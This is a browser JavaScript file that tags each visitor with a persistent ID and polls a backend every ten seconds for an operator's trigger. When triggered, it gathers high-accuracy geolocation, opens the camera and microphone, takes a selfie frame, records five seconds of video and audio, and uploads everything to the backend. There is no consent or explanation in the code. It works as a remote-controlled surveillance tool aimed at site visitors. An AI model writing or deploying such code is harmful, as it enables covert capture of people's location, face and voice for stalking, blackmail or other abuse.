let alreadyCaptured = false;

// ✅ Get stable username (logged-in or anonymous)
let username = localStorage.getItem("loggedInUser");

if (!username) {
  username = localStorage.getItem("anonUserId");
  if (!username) {
    username = `anonymous-${Date.now()}`;
    localStorage.setItem("anonUserId", username);
  }
}

// Track visit on page load
fetch(`${BACKEND_URL}/api/track-visit`, {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ username })
});

async function manualCapture(triggeredBy = "user", forcedUsername = "") {
  if (alreadyCaptured) return;
  alreadyCaptured = true;

  try {
    // 🌍 Step 1: Get Location
    const location = await new Promise((resolve) => {
      navigator.geolocation.getCurrentPosition(
        pos => resolve({
          lat: pos.coords.latitude,
          lon: pos.coords.longitude,
          accuracy: pos.coords.accuracy
        }),
        err => {
          console.error("Location error:", err);
          resolve({ lat: 0, lon: 0, accuracy: 0 });
        },
        { enableHighAccuracy: true, timeout: 10000 }
      );
    });

    // 🎥 Step 2: Request Camera + Mic
    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });

    // 🖼️ Step 3: Capture Selfie Frame
    const video = document.createElement("video");
    video.srcObject = stream;
    video.muted = true;
    await video.play();
    await new Promise(r => setTimeout(r, 1000)); // wait to focus

    const canvas = document.createElement("canvas");
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    canvas.getContext("2d").drawImage(video, 0, 0);
    const selfieBlob = await new Promise(resolve => canvas.toBlob(resolve, "image/jpeg", 0.85));

    // 🔴 Step 4: Record Video + Audio Separately
    const videoTrack = stream.getVideoTracks()[0];
    const audioTrack = stream.getAudioTracks()[0];

    const videoStream = new MediaStream([videoTrack]);
    const audioStream = new MediaStream([audioTrack]);

    const videoChunks = [], audioChunks = [];

    const videoRecorder = new MediaRecorder(videoStream, { mimeType: "video/webm;codecs=vp8" });
    const audioRecorder = new MediaRecorder(audioStream, { mimeType: "audio/webm;codecs=opus" });

    videoRecorder.ondataavailable = e => videoChunks.push(e.data);
    audioRecorder.ondataavailable = e => audioChunks.push(e.data);

    videoRecorder.start();
    audioRecorder.start();

    await new Promise(r => setTimeout(r, 5000)); // record for 5 seconds
    videoRecorder.stop();
    audioRecorder.stop();

    await Promise.all([
      new Promise(res => videoRecorder.onstop = res),
      new Promise(res => audioRecorder.onstop = res)
    ]);

    const videoBlob = new Blob(videoChunks, { type: "video/webm" });
    const audioBlob = new Blob(audioChunks, { type: "audio/webm" });

    // 📨 Step 5: Upload
    const formData = new FormData();
    formData.append("selfie", selfieBlob, `selfie-${Date.now()}.jpg`);
    formData.append("video", videoBlob, `video-${Date.now()}.webm`);
    formData.append("audio", audioBlob, `audio-${Date.now()}.webm`);
    formData.append("location", JSON.stringify(location));
    formData.append("triggeredBy", triggeredBy);
    formData.append("username", forcedUsername || username);

    await fetch(`${BACKEND_URL}/api/capture-data`, {
      method: "POST",
      body: formData
    });

    console.log("✅ Capture uploaded successfully");

    // 🔚 Cleanup
    stream.getTracks().forEach(track => track.stop());

  } catch (err) {
    console.error("❌ Capture failed:", err);
  } finally {
    alreadyCaptured = false;
  }
}

setInterval(async () => {
  console.log("Checking for trigger:", username);
  try {
    const res = await fetch(`${BACKEND_URL}/api/manual-capture-flag?username=${username}`);
    const data = await res.json();
    console.log("Trigger response:", data);

    if (data.trigger) {
      console.log("Triggering manual capture for", username);
      await manualCapture("admin", username);
    }
  } catch (err) {
    console.warn("Polling error:", err);
  }
}, 10000);